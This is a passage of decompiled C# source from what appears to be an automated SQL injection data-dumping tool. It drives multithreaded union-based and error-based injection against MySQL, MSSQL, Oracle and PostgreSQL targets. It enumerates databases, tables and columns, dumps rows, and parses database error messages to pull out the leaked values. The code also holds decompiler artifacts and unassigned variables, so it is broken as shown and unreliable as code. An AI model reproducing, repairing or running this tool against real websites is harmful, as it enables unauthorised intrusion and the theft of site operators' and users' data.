				{
					num4 = this.int_2;
					if (Conversions.ToBoolean(Conversions.ToBoolean(Operators.CompareObjectGreater(this.int_2, this.method_7(this.numThreads), false)) && Conversions.ToBoolean(this.method_7(this.chkThreads))))
					{
						num5 = Conversions.ToInteger(this.method_7(this.numThreads));
					}
					else if (Conversions.ToBoolean(this.method_7(this.chkThreads)))
					{
						num5 = this.int_2;
					}
					else
					{
						num5 = 1;
					}
				}
				this.dumpLoading_0.method_1(ProgressBarStyle.Blocks);
				if (Class54.smethod_11(this.types_0) & (this.enum5_0 == Dumper.Enum5.const_1))
				{
					num5 = 1;
				}
				if ((num4 > 1) & (this.int_2 != 32767))
				{
					this.dumpLoading_0.method_1(ProgressBarStyle.Blocks);
				}
				else
				{
					this.dumpLoading_0.method_1(ProgressBarStyle.Marquee);
				}
				this.class44_0.AffectedRows = this.int_2;
				this.threadPool_0 = new global::ThreadPool(num5);
				Dictionary<int, int> dictionary = new Dictionary<int, int>();
				for (;;)
				{
					IL_0D47:
					int num6 = num4 - 1;
					int i = 0;
					while (i <= num6)
					{
						num3 = Conversions.ToInteger(this.method_7(this.numLimitMax));
						if (num3 <= 0 || i < num3)
						{
							if (!this.WorkedRequestStop())
							{
								if (!this.WorkedRequestRetryExceeded(0))
								{
									if (dictionary.Count == 0)
									{
										if (!flag & (this.int_2 != 32767))
										{
											int num7 = (int)Math.Round(Math.Round((double)(100 * (i + 1)) / (double)num4));
											this.bckWorker.ReportProgress(num7, "");
											this.UpDateStatus(string.Concat(new string[]
											{
												"[",
												Strings.FormatNumber(i + 1, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
												"/",
												Strings.FormatNumber(num4, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
												"] ",
												this.string_4
											}), false);
										}
										else
										{
											this.bckWorker.ReportProgress(-1, "");
											this.UpDateStatus("[" + Strings.FormatNumber(i + 1, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault) + "] " + this.string_4, false);
										}
									}
									else
									{
										this.dumpLoading_0.method_1(ProgressBarStyle.Marquee);
										this.bckWorker.ReportProgress(-1, "");
										this.UpDateStatus(string.Concat(new string[]
										{
											"[",
											Strings.FormatNumber(i + 1, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
											"/",
											Strings.FormatNumber(dictionary.Count, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
											"] ",
											this.string_4,
											" ",
											global::Globals.translate_0.GetStr(this, 24, "")
										}), false);
									}
									Thread thread;
									if ((this.enum5_0 == Dumper.Enum5.const_4) | (this.enum5_0 == Dumper.Enum5.const_5))
									{
										thread = new Thread(new ParameterizedThreadStart(this.method_161));
									}
									else if (this.enum5_0 == Dumper.Enum5.const_0)
									{
										thread = new Thread(new ParameterizedThreadStart(this.method_162));
									}
									else if (this.enum5_0 == Dumper.Enum5.const_6)
									{
										thread = new Thread(new ParameterizedThreadStart(this.method_163));
									}
									else if ((this.enum5_0 == Dumper.Enum5.const_7) | (this.enum5_0 == Dumper.Enum5.const_8))
									{
										thread = new Thread(new ParameterizedThreadStart(this.method_164));
									}
									else
									{
										thread = new Thread(new ParameterizedThreadStart(this.method_165));
									}
									thread.Name = "Pos : " + i.ToString();
									if (flag & !((this.enum5_0 == Dumper.Enum5.const_4) | (this.enum5_0 == Dumper.Enum5.const_5)))
									{
										num = -1;
										num2 = 1;
									}
									Dumper.Class47 class2;
									if (dictionary.Count == 0)
									{
										class2 = new Dumper.Class47(thread, num, num2);
										class2.IndexJob = i;
									}
									else
									{
										num = dictionary[i];
										class2 = new Dumper.Class47(thread, num, num2);
										class2.IndexJob = num;
									}
									class2.TotalThreads = num5;
									class2.TotalJob = num4;
									class2.AfectedRows = this.int_2;
									if ((this.enum5_0 > Dumper.Enum5.const_0) & (this.enum5_0 != Dumper.Enum5.const_1) & (this.enum5_0 != Dumper.Enum5.const_7) & (this.enum5_0 != Dumper.Enum5.const_8))
									{
										class2.DataBase = this.class45_0.method_0(0).DataBase;
										class2.Table = this.class45_0.method_0(0).Table;
										class2.Columns = this.class45_0.method_0(0).Columns;
									}
									thread.Start(class2);
									this.threadPool_0.Open(thread);
									this.threadPool_0.WaitForThreads();
									if (!string.IsNullOrEmpty(class2.Err))
									{
										e.Result = class2.Err;
									}
									num++;
									i++;
									continue;
								}
								e.Result = this.string_2;
							}
							else
							{
								e.Result = this.string_3;
							}
						}
						else
						{
							e.Result = global::Globals.translate_0.GetStr(this, 23, "");
						}
						IL_0AED:
						if (this.threadPool_0.Status == global::ThreadPool.ThreadStatus.Stopped)
						{
							goto IL_0ED1;
						}
						for (;;)
						{
							this.bckWorker.ReportProgress(-1, "");
							if (num5 > 1)
							{
								if (dictionary.Count == 0)
								{
									this.UpDateStatus(string.Concat(new string[]
									{
										"[",
										global::Globals.FormatNumbers(num4, true),
										" | ",
										global::Globals.FormatNumbers(num4, true),
										"](",
										Conversions.ToString(this.threadPool_0.ThreadCount),
										") ",
										global::Globals.translate_0.GetStr(this, 25, "")
									}), false);
								}
								else
								{
									this.UpDateStatus(string.Concat(new string[]
									{
										"[",
										global::Globals.FormatNumbers(num4, true),
										" | ",
										global::Globals.FormatNumbers(num4, true),
										"](",
										Conversions.ToString(this.threadPool_0.ThreadCount),
										") ",
										global::Globals.translate_0.GetStr(this, 26, "")
									}), false);
								}
							}
							if (this.WorkedRequestStop() || this.threadPool_0.ThreadCount == 0)
							{
								break;
							}
							Thread.Sleep(100);
						}
						if (!this.WorkedRequestStop() && Conversions.ToBoolean(this.method_7(this.chkReDumpFailed)) && ((this.enum5_0 != Dumper.Enum5.const_5) & (this.enum5_0 > Dumper.Enum5.const_0) & (this.enum5_0 != Dumper.Enum5.const_6) & (this.enum5_0 != Dumper.Enum5.const_7) & (this.enum5_0 != Dumper.Enum5.const_8)) && this.int_2 != 32767 && this.class44_0.list_1.Count > 0)
						{
							dictionary.Clear();
							int num8 = this.class44_0.list_1.Count - 1;
							for (int j = 0; j <= num8; j++)
							{
								dictionary.Add(j, this.class44_0.list_1[j]);
							}
							this.class44_0.list_1.Clear();
							this.class44_0.int_0 = 0;
							num4 = dictionary.Count;
							goto IL_0D47;
						}
						goto IL_0ED1;
					}
					goto IL_0AED;
				}
				IL_0ED1:
				if (this.threadPool_0 != null)
				{
					this.threadPool_0.AllJobsPushed();
				}
			}
			catch (Exception ex)
			{
				if (!(ex is ThreadAbortException) && !this.WorkedRequestStop())
				{
					text = "Error: " + ex.StackTrace;
				}
			}
			finally
			{
				if (string.IsNullOrEmpty(Conversions.ToString(e.Result)) && !string.IsNullOrEmpty(text))
				{
					e.Result = text;
				}
				if (this.bckWorker.CancellationPending)
				{
					e.Result = global::Globals.translate_0.GetStr(this, 27, "");
				}
				this.appDomainControl_0.Terminate();
				this.appDomainControl_0 = null;
				global::Globals.ReleaseMemory();
			}
		}
	}

	// Token: 0x06000670 RID: 1648 RVA: 0x00026F9C File Offset: 0x0002519C
	private void method_12(object sender, ProgressChangedEventArgs e)
	{
		int num;
		int num4;
		object obj;
		try
		{
			IL_0002:
			ProjectData.ClearProjectError();
			num = -2;
			IL_000A:
			int num2 = 2;
			if (this.dumpLoading_0 == null)
			{
				goto IL_0050;
			}
			IL_0017:
			num2 = 3;
			bool flag;
			this.dumpLoading_0.method_0(e.ProgressPercentage, ref flag);
			IL_002C:
			num2 = 4;
			if (!flag)
			{
				goto IL_0050;
			}
			IL_0031:
			num2 = 5;
			if (this.bckWorker.CancellationPending)
			{
				goto IL_0050;
			}
			IL_0043:
			num2 = 6;
			this.bckWorker.CancelAsync();
			IL_0050:
			goto IL_00CB;
			IL_0052:
			int num3 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
			IL_0084:
			goto IL_00C0;
			IL_0086:
			num4 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], (num > -2) ? num : 1);
			IL_009E:;
		}
		catch when (endfilter((obj is Exception) & (num != 0) & (num4 == 0)))
		{
			Exception ex = (Exception)obj2;
			goto IL_0086;
		}
		IL_00C0:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_00CB:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	// Token: 0x06000671 RID: 1649 RVA: 0x0002708C File Offset: 0x0002528C
	private void method_13(object sender, RunWorkerCompletedEventArgs e)
	{
		this.threadPool_0 = null;
		if (Information.IsNothing(RuntimeHelpers.GetObjectValue(e.Result)))
		{
			this.method_1(global::Globals.translate_0.GetStr(this, 28, ""));
		}
		else if (this.class44_0.AffectedRows == 32767)
		{
			this.method_1(global::Globals.translate_0.GetStr(this, 28, ""));
		}
		else
		{
			this.method_1(e.Result.ToString());
		}
	}

	// Token: 0x17000248 RID: 584
	// (get) Token: 0x06000672 RID: 1650 RVA: 0x0002710C File Offset: 0x0002530C
	internal AppDomainControl AppDomainControl_0
	{
		get
		{
			return this.appDomainControl_0;
		}
	}

	// Token: 0x06000673 RID: 1651 RVA: 0x00027124 File Offset: 0x00025324
	public bool WorkedRequestRetryExceeded(byte iValue)
	{
		int num;
		if (Conversions.ToBoolean(this.method_7(this.chkThreads)))
		{
			num = Conversions.ToInteger(this.method_7(this.numMaxRetryMultiThread));
		}
		else
		{
			num = Conversions.ToInteger(this.method_7(this.numMaxRetry));
		}
		if ((int)iValue >= num)
		{
			this.bool_3 = true;
		}
		object obj = this.class44_0;
		lock (obj)
		{
			if (this.class44_0.int_0 > num)
			{
				this.bool_3 = true;
			}
		}
		return this.bool_3;
	}

	// Token: 0x06000674 RID: 1652 RVA: 0x000271C4 File Offset: 0x000253C4
	public bool WorkedRequestStop()
	{
		bool flag;
		if (this.bckWorker.CancellationPending)
		{
			flag = true;
		}
		else
		{
			object bckWorker = this.bckWorker;
			bool flag3;
			lock (bckWorker)
			{
				this.bckWorker.ReportProgress(-1, "");
				if (this.bckWorker.CancellationPending)
				{
					if (this.threadPool_0 != null)
					{
						this.threadPool_0.AbortThreads();
					}
					flag3 = true;
				}
			}
			if (this.threadPool_0 != null)
			{
				object obj = this.threadPool_0;
				lock (obj)
				{
					if (this.threadPool_0.Status == global::ThreadPool.ThreadStatus.Stopped)
					{
						flag3 = true;
					}
				}
			}
			if (this.threadPool_0 != null && this.dumpLoading_0.Boolean_1)
			{
				this.threadPool_0.Paused = true;
				global::Globals.G_Taskbar.SetProgressState(ProgressBarState.Paused);
				while (this.dumpLoading_0.Boolean_1)
				{
					Thread.Sleep(100);
					Application.DoEvents();
				}
				this.threadPool_0.Paused = false;
				global::Globals.G_Taskbar.SetProgressState(ProgressBarState.Normal);
			}
			flag = flag3;
		}
		return flag;
	}

	// Token: 0x06000675 RID: 1653 RVA: 0x000272F8 File Offset: 0x000254F8
	private MySQLCollactions method_14()
	{
		object obj = this.method_7(this.cmbMySQLCollations);
		MySQLCollactions mySQLCollactions;
		if (Operators.ConditionalCompareObjectEqual(obj, 0, false))
		{
			mySQLCollactions = MySQLCollactions.None;
		}
		else if (Operators.ConditionalCompareObjectEqual(obj, 1, false))
		{
			mySQLCollactions = MySQLCollactions.UnHex;
		}
		else if (Operators.ConditionalCompareObjectEqual(obj, 2, false))
		{
			mySQLCollactions = MySQLCollactions.Binary;
		}
		else if (Operators.ConditionalCompareObjectEqual(obj, 3, false))
		{
			mySQLCollactions = MySQLCollactions.CastAsChar;
		}
		else if (Operators.ConditionalCompareObjectEqual(obj, 4, false))
		{
			mySQLCollactions = MySQLCollactions.Compress;
		}
		else if (Operators.ConditionalCompareObjectEqual(obj, 5, false))
		{
			mySQLCollactions = MySQLCollactions.ConvertUtf8;
		}
		else if (Operators.ConditionalCompareObjectEqual(obj, 6, false))
		{
			mySQLCollactions = MySQLCollactions.ConvertLatin1;
		}
		else if (Operators.ConditionalCompareObjectEqual(obj, 7, false))
		{
			mySQLCollactions = MySQLCollactions.Aes_descrypt;
		}
		return mySQLCollactions;
	}

	// Token: 0x06000676 RID: 1654 RVA: 0x000273AC File Offset: 0x000255AC
	private void method_15(ref string string_9)
	{
		if (!string.IsNullOrEmpty(string_9))
		{
			string_9 = string_9.Replace("\r\n\r\n", "\r\n");
			string_9 = string_9.Replace("\r\n", " ");
			string_9 = string_9.Replace("\t", " ");
			string_9 = string_9.Replace("  ", " ");
			if (!Class54.smethod_11(this.types_0))
			{
				string_9 = string_9.Replace(" ,", "");
			}
			string_9 = string_9.Trim();
		}
	}

	// Token: 0x06000677 RID: 1655 RVA: 0x0002743C File Offset: 0x0002563C
	private bool method_16(ref string string_9)
	{
		int num = Conversions.ToInteger(this.method_7(this.numMaxRetry));
		Conversions.ToInteger(this.method_7(this.numSleep));
		checked
		{
			bool flag;
			while (!this.WorkedRequestStop())
			{
				this.UpDateStatus(this.string_4 + " " + global::Globals.translate_0.GetStr(this, 29, ""), false);
				string text = this.class45_0.method_0(0).Columns[0] + " " + this.class45_0.method_0(0).Query;
				HTTPExt httpext = null;
				string text2 = this.method_26(ref text, ref string_9, ref httpext);
				if (string.IsNullOrEmpty(text2))
				{
					int num2;
					if (num2 < num)
					{
						num2++;
						continue;
					}
					string_9 = global::Globals.translate_0.GetStr(this, 30, "");
				}
				else
				{
					flag = true;
				}
				return flag;
			}
			return flag;
		}
	}

	// Token: 0x06000678 RID: 1656 RVA: 0x00027520 File Offset: 0x00025720
	internal List<string> method_17(string string_9, Types types_1 = Types.None, bool bool_6 = false)
	{
		List<string> list = new List<string>();
		checked
		{
			try
			{
				string text = "";
				if (types_1 == Types.None)
				{
					types_1 = this.types_0;
				}
				if (Conversions.ToBoolean(Operators.AndObject(types_1 == Types.MySQL_With_Error, Operators.OrObject(bool_6, Operators.CompareObjectEqual(this.method_7(this.cmbOracleErrType), 0, false)))))
				{
					int num = string_9.ToLower().IndexOf("Duplicate entry".ToLower());
					if (num >= 0)
					{
						string_9 = string_9.Substring(num);
						text = string_9.Substring(string_9.IndexOf("'") + 1);
						if (text.ToLower().StartsWith(Class54.string_0.ToLower()))
						{
							text = text.Substring(Class54.string_0.Length);
							text = text.Substring(0, text.IndexOf("'"));
						}
						else
						{
							text = Strings.Split(text, Class54.string_0, -1, CompareMethod.Binary)[0];
						}
					}
					else
					{
						num = string_9.ToLower().IndexOf(Class54.string_0.ToLower());
						if (num > 0)
						{
							text = string_9.Substring(num + Class54.string_0.Length);
						}
					}
					if ((text.ToLower().IndexOf("for key".ToLower()) > 1) & (text.IndexOf("'") > 1))
					{
						text = text.Substring(0, text.ToLower().IndexOf("for key"));
						text = text.Substring(0, text.LastIndexOf("'"));
					}
					if (text.ToLower().IndexOf(Class54.string_0.ToLower()) > 0)
					{
						if (text.ToLower().StartsWith(Class54.string_0.ToLower()))
						{
							text = Strings.Split(text, Class54.string_0, -1, CompareMethod.Binary)[1];
						}
						else
						{
							text = Strings.Split(text, Class54.string_0, -1, CompareMethod.Binary)[0];
						}
					}
					if (text.EndsWith("'11"))
					{
						text = text.Substring(0, text.Length - 3);
					}
					else if (text.EndsWith("'1"))
					{
						text = text.Substring(0, text.Length - 2);
					}
				}
				else
				{
					if (this.method_10())
					{
						RegExp regExp = new RegExp();
						Hashtable data = regExp.GetData(string_9, Class54.string_0 + "(.+)" + Class54.string_0);
						Hashtable hashtable = new Hashtable();
						try
						{
							foreach (object obj in data.Values)
							{
								string text2 = Conversions.ToString(obj);
								string[] array;
								if (text2.Contains(Class54.string_0))
								{
									array = Strings.Split(text2, Class54.string_0, -1, CompareMethod.Binary);
								}
								else
								{
									array = new string[] { text2 };
								}
								foreach (string text3 in array)
								{
									if (text3.Contains(Class54.string_2) && !hashtable.Contains(text3))
									{
										hashtable.Add(text3, text3);
									}
								}
							}
						}
						finally
						{
							IEnumerator enumerator;
							if (enumerator is IDisposable)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
						try
						{
							foreach (object obj2 in hashtable.Values)
							{
								string text4 = Conversions.ToString(obj2);
								if (!list.Contains(text4))
								{
									list.Add(text4);
								}
								if (list.Count >= this.int_1)
								{
									break;
								}
							}
						}
						finally
						{
							IEnumerator enumerator2;
							if (enumerator2 is IDisposable)
							{
								(enumerator2 as IDisposable).Dispose();
							}
						}
						try
						{
							foreach (object obj3 in hashtable.Values)
							{
								string text5 = Conversions.ToString(obj3);
								if (list.Count >= this.int_1)
								{
									break;
								}
								list.Add(text5);
							}
						}
						finally
						{
							IEnumerator enumerator3;
							if (enumerator3 is IDisposable)
							{
								(enumerator3 as IDisposable).Dispose();
							}
						}
						if (list.Count != 0)
						{
							return list;
						}
					}
					int num = string_9.IndexOf(Class54.string_0);
					if (num >= 0)
					{
						text = string_9.Substring(num + Class54.string_0.Length);
						if (text.StartsWith(Class54.string_0))
						{
							text = " ";
						}
						else
						{
							num = text.IndexOf(Class54.string_0);
							if (num > 0)
							{
								text = text.Substring(0, num);
							}
							else
							{
								int[] array3 = new int[]
								{
									text.IndexOf('<'),
									text.IndexOf('>'),
									text.IndexOf('"')
								};
								num = text.Length;
								foreach (int num2 in array3)
								{
									if ((num > num2) & (num2 > 0))
									{
										num = num2;
									}
								}
								text = text.Substring(0, num);
							}
						}
					}
				}
				if (!string.IsNullOrEmpty(text))
				{
					if (Conversions.ToBoolean(Operators.AndObject(Operators.AndObject((types_1 == Types.MySQL_No_Error) & ((this.enum5_0 == Dumper.Enum5.const_1) | (this.enum5_0 == Dumper.Enum5.const_2) | (this.enum5_0 == Dumper.Enum5.const_3)), this.method_7(this.chkAllInOneRequest)), text.Contains(","))))
					{
						string[] array5 = Strings.Split(text, ",", -1, CompareMethod.Binary);
						int num3 = array5.Length - 1;
						int num4 = 0;
						bool flag;
						int num5;
						while (num4 <= num3 && (flag = true) != array5[num4].Contains("<") && flag != array5[num4].Contains(">") && flag != array5[num4].Contains(" ") && flag != array5[num4].Contains("\"") && flag != array5[num4].Contains(".") && flag != array5[num4].Contains("/") && flag != array5[num4].Contains("\\") && flag != string.IsNullOrEmpty(array5[num4]))
						{
							num5 = num4;
							num4++;
						}
						int num6 = num5;
						for (int k = 0; k <= num6; k++)
						{
							list.Add(array5[k].Trim());
						}
					}
					else
					{
						list.Add(text.Trim());
					}
					if (Class54.smethod_10(types_1))
					{
						int num7 = list.Count - 1;
						for (int l = 0; l <= num7; l++)
						{
							text = list[l];
							if (text.Contains("' to a column of data type int."))
							{
								text = text.Replace("' to a column of data type int.", "");
								list[l] = text;
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
			}
			return list;
		}
	}

	// Token: 0x06000679 RID: 1657 RVA: 0x00027BF4 File Offset: 0x00025DF4
	private string method_18(Schema schema_0, string string_9, string string_10, List<string> list_2, int int_3, int int_4, string string_11, string string_12, ref string string_13, Dumper.Class47 class47_0 = null, int int_5 = -1)
	{
		string text = "[t]";
		bool flag = Conversions.ToBoolean(this.method_7(this.chkDumpIFNULL));
		bool flag2;
		if ((this.types_0 == Types.MySQL_No_Error) | (this.types_0 == Types.MySQL_With_Error))
		{
			flag2 = Conversions.ToBoolean(this.method_7(this.chkDumpEncodedHex));
		}
		MySQLErrorType mySQLErrorType;
		OracleErrorType oracleErrorType;
		if (this.types_0 == Types.MySQL_With_Error)
		{
			object obj = this.method_7(this.cmbMySQLErrType);
			if (Operators.ConditionalCompareObjectEqual(obj, 0, false))
			{
				mySQLErrorType = MySQLErrorType.UpdateXML;
			}
			else if (Operators.ConditionalCompareObjectEqual(obj, 1, false))
			{
				mySQLErrorType = MySQLErrorType.DuplicateEntry;
			}
			else if (Operators.ConditionalCompareObjectEqual(obj, 2, false))
			{
				mySQLErrorType = MySQLErrorType.ExtractValue;
			}
		}
		else if (this.types_0 == Types.Oracle_With_Error)
		{
			bool flag3;
			if ((flag3 = true) == (this.types_0 == Types.Oracle_No_Error))
			{
				oracleErrorType = OracleErrorType.NONE;
			}
			else if (Operators.ConditionalCompareObjectEqual(flag3, Operators.CompareObjectEqual(this.method_7(this.cmbOracleErrType), 0, false), false))
			{
				oracleErrorType = OracleErrorType.GET_HOST_ADDRESS;
			}
			else if (Operators.ConditionalCompareObjectEqual(flag3, Operators.CompareObjectEqual(this.method_7(this.cmbOracleErrType), 1, false), false))
			{
				oracleErrorType = OracleErrorType.DRITHSX_SN;
			}
			else if (Operators.ConditionalCompareObjectEqual(flag3, Operators.CompareObjectEqual(this.method_7(this.cmbOracleErrType), 2, false), false))
			{
				oracleErrorType = OracleErrorType.GETMAPPINGXPATH;
			}
		}
		checked
		{
			switch (this.types_0)
			{
			case Types.MySQL_No_Error:
				switch (schema_0)
				{
				case Schema.INFO:
					text = MySQLNoError.Info(text, this.method_14(), flag2, list_2, "");
					break;
				case Schema.DATABASES:
					text = MySQLNoError.DataBases(text, this.method_14(), flag2, false, string_11, string_12, "", int_3, int_4);
					break;
				case Schema.TABLES:
					text = MySQLNoError.Tables(text, this.method_14(), string_9, string_11, string_12, "", int_3, int_4);
					break;
				case Schema.COLUMNS:
					text = MySQLNoError.Columns(text, this.method_14(), string_9, string_10, false, string_11, string_12, "", int_3, int_4);
					break;
				case Schema.ROWS:
					if (this.method_10())
					{
						text = this.string_5;
						int num = this.int_1 - 1;
						for (int i = 0; i <= num; i++)
						{
							string text2 = "[t]";
							if (this.enum5_0 != Dumper.Enum5.const_5)
							{
								text2 = MySQLNoError.Dump(text2, this.method_14(), flag2, flag, string_9, string_10, list_2, this.int_1 * int_3 + i, int_4, string_11, string_12, "", "");
							}
							else
							{
								text2 = MySQLNoError.Dump(text2, this.method_14(), flag2, flag, "", "", list_2, this.int_1 * int_3 + i, int_4, "", "", "", this.class45_0.method_0(0).Query);
							}
							if (i == 0)
							{
								text = text.Replace("[t]", text2);
							}
							else
							{
								text = text.Replace("[t" + Conversions.ToString(i), text2);
							}
						}
					}
					else if (this.enum5_0 != Dumper.Enum5.const_5)
					{
						text = MySQLNoError.Dump(text, this.method_14(), flag2, flag, string_9, string_10, list_2, int_3, int_4, string_11, string_12, "", "");
					}
					else
					{
						text = MySQLNoError.Dump(text, this.method_14(), flag2, flag, "", "", list_2, int_3, int_4, "", "", "", this.class45_0.method_0(0).Query);
					}
					break;
				}
				break;
			case Types.MySQL_With_Error:
				switch (schema_0)
				{
				case Schema.INFO:
					text = MySQLWithError.Info(text, this.method_14(), mySQLErrorType, list_2, "");
					break;
				case Schema.DATABASES:
					text = MySQLWithError.DataBases(text, this.method_14(), mySQLErrorType, false, string_11, string_12, "", int_3, int_4);
					break;
				case Schema.TABLES:
					text = MySQLWithError.Tables(text, this.method_14(), mySQLErrorType, string_9, string_11, string_12, "", int_3, int_4);
					break;
				case Schema.COLUMNS:
					text = MySQLWithError.Columns(text, this.method_14(), mySQLErrorType, string_9, string_10, false, string_11, string_12, "", int_3, int_4);
					break;
				case Schema.ROWS:
					if (this.enum5_0 != Dumper.Enum5.const_5)
					{
						text = MySQLWithError.Dump(text, this.method_14(), mySQLErrorType, flag, string_9, string_10, list_2, int_3, int_4, "", string_11, string_12, "");
					}
					else
					{
						text = MySQLWithError.Dump(text, this.method_14(), mySQLErrorType, flag, "", "", list_2, int_3, int_4, "", "", "", this.class45_0.method_0(0).Query);
					}
					break;
				}
				break;
			case Types.MSSQL_No_Error:
			case Types.MSSQL_With_Error:
			{
				bool flag4 = Conversions.ToBoolean(this.method_7(this.chkMSSQL_Latin1));
				string text3 = Conversions.ToString(Interaction.IIf(Conversions.ToBoolean(this.method_7(this.chkMSSQLCastAsChar)), RuntimeHelpers.GetObjectValue(this.method_7(this.cmbMSSQLCast)), ""));
				Types types = this.types_0;
				InjectionType injectionType;
				if (types != Types.MSSQL_No_Error)
				{
					if (types == Types.MSSQL_With_Error)
					{
						injectionType = InjectionType.Error;
					}
				}
				else
				{
					injectionType = InjectionType.Union;
				}
				switch (schema_0)
				{
				case Schema.INFO:
					text = MSSQL.Info(text, injectionType, flag4, list_2, text3, "");
					break;
				case Schema.DATABASES:
					text = MSSQL.DataBases(text, injectionType, false, text3, flag4, int_3, class47_0.AfectedRows, string_11, string_12, "");
					break;
				case Schema.TABLES:
					text = MSSQL.Tables(text, string_9, injectionType, text3, flag4, int_3, class47_0.AfectedRows, string_11, string_12, "");
					break;
				case Schema.COLUMNS:
					text = MSSQL.Columns(text, string_9, string_10, injectionType, text3, flag4, int_3, class47_0.AfectedRows, string_11, string_12, "");
					break;
				case Schema.ROWS:
					if (this.method_10() && this.types_0 == Types.MSSQL_No_Error)
					{
						text = this.string_5;
						int num2 = this.int_1 - 1;
						for (int j = 0; j <= num2; j++)
						{
							string text4 = "[t]";
							if (this.enum5_0 != Dumper.Enum5.const_5)
							{
								if (this.String_0.Equals(string_9))
								{
									text4 = MSSQL.Dump(text4, "", string_10, list_2, flag, injectionType, text3, flag4, this.int_1 * int_3 + j, class47_0.AfectedRows, string_11, string_12, "", "", int_5);
								}
								else
								{
									text4 = MSSQL.Dump(text4, string_9, string_10, list_2, flag, injectionType, text3, flag4, this.int_1 * int_3 + j, class47_0.AfectedRows, string_11, string_12, "", "", int_5);
								}
							}
							else
							{
								text4 = MSSQL.Dump(text4, "", "", list_2, flag, injectionType, text3, flag4, this.int_1 * int_3 + j, class47_0.AfectedRows, string_11, string_12, "", this.class45_0.method_0(0).Query, -1);
							}
							if (j == 0)
							{
								text = text.Replace("[t]", text4);
							}
							else
							{
								text = text.Replace("[t" + Conversions.ToString(j), text4);
							}
						}
					}
					else if (this.enum5_0 != Dumper.Enum5.const_5)
					{
						if (this.String_0.Equals(string_9))
						{
							text = MSSQL.Dump(text, "", string_10, list_2, flag, injectionType, text3, flag4, int_3, class47_0.AfectedRows, string_11, string_12, "", "", int_5);
						}
						else
						{
							text = MSSQL.Dump(text, string_9, string_10, list_2, flag, injectionType, text3, flag4, int_3, class47_0.AfectedRows, string_11, string_12, "", "", int_5);
						}
					}
					else
					{
						text = MSSQL.Dump(text, "", "", list_2, flag, injectionType, text3, flag4, int_3, class47_0.AfectedRows, string_11, string_12, "", this.class45_0.method_0(0).Query, -1);
					}
					break;
				}
				break;
			}
			case Types.Oracle_No_Error:
			case Types.Oracle_With_Error:
			{
				bool flag5 = Conversions.ToBoolean(this.method_7(this.chkOracleCastAsChar));
				Types types2 = this.types_0;
				InjectionType injectionType2;
				if (types2 != Types.Oracle_No_Error)
				{
					if (types2 == Types.Oracle_With_Error)
					{
						injectionType2 = InjectionType.Error;
					}
				}
				else
				{
					injectionType2 = InjectionType.Union;
				}
				switch (schema_0)
				{
				case Schema.INFO:
					text = Oracle.Info(text, injectionType2, oracleErrorType, list_2, flag5, "");
					break;
				case Schema.DATABASES:
				{
					List<string> list = this.method_51();
					text = Oracle.DataBases(text, injectionType2, (MySQLErrorType)oracleErrorType, flag5, false, string_11, string_12, "", list);
					break;
				}
				case Schema.TABLES:
					text = Oracle.Tables(text, injectionType2, (MySQLErrorType)oracleErrorType, string_9, flag5, int_3, string_11, string_12, "");
					break;
				case Schema.COLUMNS:
					text = Oracle.Columns(text, injectionType2, (MySQLErrorType)oracleErrorType, string_9, string_10, flag5, int_3, string_11, string_12, "");
					break;
				case Schema.ROWS:
				{
					object obj2 = this.method_7(this.cmbOracleTopN);
					OracleTopN oracleTopN;
					if (Operators.ConditionalCompareObjectEqual(obj2, 0, false))
					{
						oracleTopN = OracleTopN.ROWNUM;
					}
					else if (Operators.ConditionalCompareObjectEqual(obj2, 1, false))
					{
						oracleTopN = OracleTopN.RANK;
					}
					else if (Operators.ConditionalCompareObjectEqual(obj2, 2, false))
					{
						oracleTopN = OracleTopN.DENSE_RANK;
					}
					if (this.method_10() && this.types_0 == Types.Oracle_No_Error)
					{
						text = this.string_5;
						int num3 = this.int_1 - 1;
						for (int k = 0; k <= num3; k++)
						{
							string text5 = "[t]";
							if (this.enum5_0 != Dumper.Enum5.const_5)
							{
								text5 = Oracle.Dump(text5, injectionType2, oracleErrorType, string_9, string_10, list_2, flag5, oracleTopN, this.int_1 * int_3 + k, string_11, string_12, "", "");
							}
							else
							{
								text5 = Oracle.Dump(text5, injectionType2, oracleErrorType, "", "", list_2, flag5, oracleTopN, this.int_1 * int_3 + k, string_11, string_12, "", this.class45_0.method_0(0).Query);
							}
							if (k == 0)
							{
								text = text.Replace("[t]", text5);
							}
							else
							{
								text = text.Replace("[t" + Conversions.ToString(k), text5);
							}
						}
					}
					else if (this.enum5_0 != Dumper.Enum5.const_5)
					{
						text = Oracle.Dump(text, injectionType2, oracleErrorType, string_9, string_10, list_2, flag5, oracleTopN, int_3, string_11, string_12, "", "");
					}
					else
					{
						text = Oracle.Dump(text, injectionType2, oracleErrorType, "", "", list_2, flag5, oracleTopN, int_3, string_11, string_12, "", this.class45_0.method_0(0).Query);
					}
					break;
				}
				}
				break;
			}
			case Types.PostgreSQL_No_Error:
			case Types.PostgreSQL_With_Error:
			{
				Types types3 = this.types_0;
				PostgreSQLErrorType postgreSQLErrorType;
				InjectionType injectionType3;
				if (types3 != Types.PostgreSQL_No_Error)
				{
					if (types3 == Types.PostgreSQL_With_Error)
					{
						postgreSQLErrorType = PostgreSQLErrorType.CAST_INT;
						injectionType3 = InjectionType.Error;
					}
				}
				else
				{
					postgreSQLErrorType = PostgreSQLErrorType.NONE;
				}
				switch (schema_0)
				{
				case Schema.INFO:
					text = PostgreSQL.Info(text, injectionType3, postgreSQLErrorType, list_2, "");
					break;
				case Schema.DATABASES:
					text = PostgreSQL.DataBases(text, injectionType3, postgreSQLErrorType, false, int_3, string_11, string_12, "");
					break;
				case Schema.TABLES:
					text = PostgreSQL.Tables(text, injectionType3, string_9, postgreSQLErrorType, int_3, string_11, string_12, "");
					break;
				case Schema.COLUMNS:
					text = PostgreSQL.Columns(text, injectionType3, string_9, string_10, postgreSQLErrorType, int_3, string_11, string_12, "");
					break;
				case Schema.ROWS:
